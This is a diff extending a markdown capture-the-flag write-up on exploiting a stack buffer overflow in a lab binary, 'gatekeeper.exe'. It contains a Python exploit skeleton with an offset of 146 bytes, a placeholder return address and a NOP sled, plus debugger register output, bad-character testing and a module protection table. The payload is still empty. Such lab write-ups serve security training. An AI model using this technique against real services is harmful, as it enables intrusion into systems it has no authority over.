@@ -192,3 +192,82 @@ Immunity Debugger gave EIP 39654138 now use msf-patter-offset we find 146 charac
 
 [*] Exact match at offset 146
 ```
+Based on this a simple script now contains the following where, BBBB will be our return location later and payload made after badchars checked.
+```
+import socket
+import sys
+
+message = b'A' * 146 + b'B' * 4
+nops = b"/x90" * 20
+payload = b""
+
+try: 
+	print("Sending payload:...")
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect(('192.168.0.199',31337))
+	s.send((b'\r\n'))
+	s.send((message + nops + payload + b'\r\n'))
+	s.close()
+
+except:
+	print("Cannot connect to the server")
+	sys.exit()
+```
+And a quick tests show using BBBB as a return address, we are on target using 146 as padding before EIP, with nop sled after to shell code.
+```
+EAX FFFFFFFF
+ECX 61D56613
+EDX 00000000
+EBX 0058D030
+ESP 003719F0 ASCII "/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90
+!!!
+"
+EBP 41414141
+ESI 08041470 gatekeep.08041470
+EDI 0058D030
+EIP 42424242
+```
+## Bad char testing
+
+Sent \x01 through to \xFF to look for characters that did not show, Immunity did show full black squares for \x21 and \xFE but on restest by inserting b"\x21\xFE\x21\xFE" before BBBB pushing it beyond it. I could see !■!■ in there place so not bad after all. I will move on assuming only \x00 is bad.
+
+```
+00601A80   41414141  AAAA
+00601A84   41414141  AAAA
+00601A88   41414141  AAAA
+00601A8C   FE21FE21  !■!■
+00601A90   42424242  BBBB
+...
+```
+
+```
+- Nr of modules displayed after filters: **21**
+- PEB order: **InLoadOrder**
+
+| Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Details                                                                                                            |
+| ---------- | ---------- | ---------- | ------ | ------- | ----- | ----- | -------- | ------ | ------------------------------------------------------------------------------------------------------------------ |
+| 0x731b0000 | 0x731b4000 | 0x00004000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-convert-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-convert-l1-1-0.dll) 0x540 |
+| 0x08040000 | 0x08048000 | 0x00008000 | False  | True    | False | False | False    | False  | -1.0- [gatekeeper.exe] (C:\Users\Administrator\Desktop\TRYHACKME CTF\Gatekeeper\gatekeeper.exe) 0x8000             |
+| 0x731c0000 | 0x731c4000 | 0x00004000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-string-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-string-l1-1-0.dll) 0x540   |
+| 0x75820000 | 0x75861000 | 0x00041000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [sechost.dll] (C:\Windows\SYSTEM32\sechost.dll) 0x4140                                              |
+| 0x75540000 | 0x75547000 | 0x00007000 | True   | False   | True  | True  | True     | True   | 6.3.9600.17415 [NSI.dll] (C:\Windows\SYSTEM32\NSI.dll) 0x4540                                                      |
+| 0x77480000 | 0x775c0000 | 0x00140000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [KERNEL32.DLL] (C:\Windows\SYSTEM32\KERNEL32.DLL) 0x4140                                            |
+| 0x77a50000 | 0x77bbe000 | 0x0016e000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll) 0x4140                                                  |
+| 0x73210000 | 0x73214000 | 0x00004000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-stdio-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-stdio-l1-1-0.dll) 0x540     |
+| 0x75990000 | 0x75a67000 | 0x000d7000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [KERNELBASE.dll] (C:\Windows\SYSTEM32\KERNELBASE.dll) 0x4140                                        |
+| 0x77370000 | 0x773c0000 | 0x00050000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [WS2_32.dll] (C:\Windows\SYSTEM32\WS2_32.dll) 0x4140                                                |
+| 0x730d0000 | 0x731ac000 | 0x000dc000 | True   | True    | True  | True  | True     | True   | 10.0.10240.16390 [ucrtbase.DLL] (C:\Windows\SYSTEM32\ucrtbase.DLL) 0x4140                                          |
+| 0x751e0000 | 0x75234000 | 0x00054000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [bcryptPrimitives.dll] (C:\Windows\SYSTEM32\bcryptPrimitives.dll) 0x41c0                            |
+| 0x731d0000 | 0x731d3000 | 0x00003000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-heap-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-heap-l1-1-0.dll) 0x540       |
+| 0x75240000 | 0x7524a000 | 0x0000a000 | True   | False   | True  | True  | True     | True   | 6.3.9600.17415 [CRYPTBASE.dll] (C:\Windows\SYSTEM32\CRYPTBASE.dll) 0x4540                                          |
+| 0x73200000 | 0x73204000 | 0x00004000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-runtime-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-runtime-l1-1-0.dll) 0x540 |
+| 0x73470000 | 0x734bb000 | 0x0004b000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [mswsock.dll] (C:\Windows\system32\mswsock.dll) 0x4140                                              |
+| 0x731e0000 | 0x731e3000 | 0x00003000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-locale-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-locale-l1-1-0.dll) 0x540   |
+| 0x75ab0000 | 0x75b6a000 | 0x000ba000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [RPCRT4.dll] (C:\Windows\SYSTEM32\RPCRT4.dll) 0x4140                                                |
+| 0x75250000 | 0x7526e000 | 0x0001e000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [SspiCli.dll] (C:\Windows\SYSTEM32\SspiCli.dll) 0x4140                                              |
+| 0x73220000 | 0x73235000 | 0x00015000 | True   | True    | True  | True  | True     | True   | 14.44.35211.0 [VCRUNTIME140.dll] (C:\Windows\SYSTEM32\VCRUNTIME140.dll) 0x4140                                     |
+| 0x731f0000 | 0x731f5000 | 0x00005000 | True   | False   | True  | False | True     | True   | 10.0.10240.16390 [api-ms-win-crt-math-l1-1-0.dll] (C:\Windows\SYSTEM32\api-ms-win-crt-math-l1-1-0.dll) 0x540       |
+----------
+
+
+```
